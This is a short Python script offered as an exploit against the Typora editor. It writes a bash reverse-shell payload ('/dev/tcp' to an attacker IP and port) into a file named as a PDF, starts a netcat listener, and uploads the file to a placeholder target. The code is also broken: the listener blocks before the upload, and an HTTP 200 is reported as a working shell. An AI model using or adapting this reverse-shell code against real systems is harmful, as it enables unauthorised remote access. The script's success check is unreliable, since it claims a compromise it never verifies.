import os
import sys
import requests

# Attacker's IP and port
attacker_ip = input("Enter your IP Address: ")
attacker_port = int(input("Enter Listening port (example: 4444): "))

# Typora PDF file path
pdf_file = input("Enter PDF Name with .pdf: ")

# Payload to create a reverse shell
payload = f"http://{attacker_ip}:{attacker_port}/?exploit=%20`bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1`"

# Create the PDF with the malicious payload
os.system(f"echo '[{payload}]' > {pdf_file}")

# Start listening for the reverse shell
os.system(f"nc -lvnp {attacker_port}")

# Send the PDF to the target
# Replace 'http://target-ip:port/' with the actual target URL
target_url = "http://target-ip:port/"
files = {'file': open(pdf_file, 'rb')}
response = requests.post(target_url, files=files)

# Check if the reverse shell was successful
if response.status_code == 200:
    print("Exploit successful. Reverse shell established.")
else:
    print("Exploit failed.")
